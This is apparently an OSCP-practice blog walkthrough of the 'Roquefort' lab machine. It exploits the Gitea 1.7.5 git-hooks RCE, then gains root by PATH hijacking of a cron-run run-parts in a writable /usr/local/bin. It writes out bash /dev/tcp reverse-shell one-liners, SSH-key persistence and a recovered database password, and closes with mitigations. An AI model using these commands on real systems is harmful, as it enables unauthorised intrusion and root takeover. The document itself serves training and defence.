---
title: Roquefort
date: 2025-05-15
categories: [oscp, pg-practice]
tags: [oscp-preparation, walkthrough, gitea-git-hooks, CVE-2020-14144, cron-job-PATH-hijacking-privesc ] 
image: roq.jpg
media_subpath: /assets/img/posts/2025-05-16-roquefort/
---

## Introduction

In this walkthrough, we exploit an **authenticated remote code execution (RCE)** vulnerability in **Gitea version 1.7.5** to gain an initial foothold on the target machine. After successful exploitation, we gain a shell as a low-privileged user.

For privilege escalation, we identify **weak directory permissions** on `/usr/local/bin/`, which is writable. Combined with a **cron job** that executes scripts without full paths, we perform **PATH hijacking** by placing a malicious script in the writable directory, resulting in **code execution as root**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 21

Version - ProFTPD 1.3.5b

[ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)](s://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/49908&ved=2ahUKEwisjIHgp6aNAxVOhv0HHQEYA9MQFnoECBsQAQ&usg=AOvVaw297_acnttdRbGslRe4v3YT)

[ProFTPd 1.3.5 - File Copy](https://www.exploit-db.com/exploits/36742)

Anonymous access is not allowed and common credentials like `admin:admin`, `admin:password`do not work.

### Port 22

Version  - OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)

We usually skip SSH.

### Port 2222

Version - Dropbear sshd 2016.74 (protocol 2.0)

[Dropbear SSH 0.34 - Remote Code Execution](https://www.exploit-db.com/exploits/387)

[DropBearSSHD 2015.71 - Command Injection](https://www.exploit-db.com/exploits/40119)

## Web

### Port 3000

Version - Golang net/http server

## Exploitation

[Gitea 1.7.5 - Remote Code Execution](https://www.exploit-db.com/exploits/49383)

We need a valid account with `'"May create git hooks" rights activated."` which is default for administrative users, and for non-administrative users this permission should be granted by an administrator.

I followed instructions given here:

[https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce/blob/main/README.md](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce/blob/main/README.md)

I got the reverse shell, my reverse shell immediately died with :

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

But then I used:

```bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

I see `.ssh` directory for `chloe` user in order to ensure persistence I am gonna create ssh keys and put them there.

```bash
ssh-keygen -t rsa
```

>**VERY important:**

- `.ssh` must be `700`
- `authorized_keys` must be `600`
- Owned by `chloe`

Otherwise SSH **refuses** to use them.
{: .prompt-warning }

When you have gained access exploiting some service first carefully enumerate sensitive and important files related to that service. For `gitea` I found `gitea.db` , and searching for it from root directory using the command:

```bash
grep -r "gitea.db"
```

I found it is mentioned in `/etc/gitea/app.ini` , and I found a password for the locally accessible MySQL database there, 

```bash
[database]
DB_TYPE  = mysql
HOST     = 127.0.0.1:3306
NAME     = giteadb
USER     = gitea
PASSWD   = 7d98afcbd8a6c5b8c2dfb07bcbe29d34
SSL_MODE = disable
PATH     = data/gitea.db
```

I used this password to login as root but it didn’t work, then I used `mysql` and connected to database.

```bash
mysql -u gitea -p 
```

I analyzed `giteadb` database `user` table and found just my newly created users names and their passwords and nothing interesting, but this step was important as it may have provided password for potentially privileged user or for lateral movement.

## Privilege Escalation

- OSCP checklist
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse
    - [ ]  Hunting Sensitive Information
    - [ ]  Sudo
    - [ ]  SUID/SGID
    - [ ]  Capabilities
    - [ ]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles

Running [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS):

![image.png](image%203.png)

We have just one binary there which is owned by us, so that does not give us anything very useful.

Checking `/etc/crontab` I can see `run-parts` binary run by root and also we see that the binary’s absolute path is not defined there, that means we can inject our binary in upper directories in the `PATH`, that could be `/usr/local/bin` which is controlled directory by us.

![image.png](image%205.png)

We can put our malicious binary in `/usr/local/bin` and wait for 5 minutes until the binary is executed.

I put the following content to the new `run-parts` binary:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.45.205/21 0>&1'
```

![image.png](image%206.png)

After waiting a bit we got a connection:

![image.png](image%207.png)

Now we are root!

## Mitigation

- **Update Gitea** to the latest version, as older versions like 1.7.5 contain known RCE vulnerabilities.
- Restrict **write permissions** on sensitive directories like `/usr/local/bin/` to trusted administrators only.
- Avoid relying on the **PATH environment variable** in scripts run by privileged users or cron jobs—always use **absolute paths**.
- Regularly **audit file and directory permissions**, especially those involved in scheduled or automated tasks.
- Implement **least privilege access** and continuously monitor for suspicious privilege escalation activity.
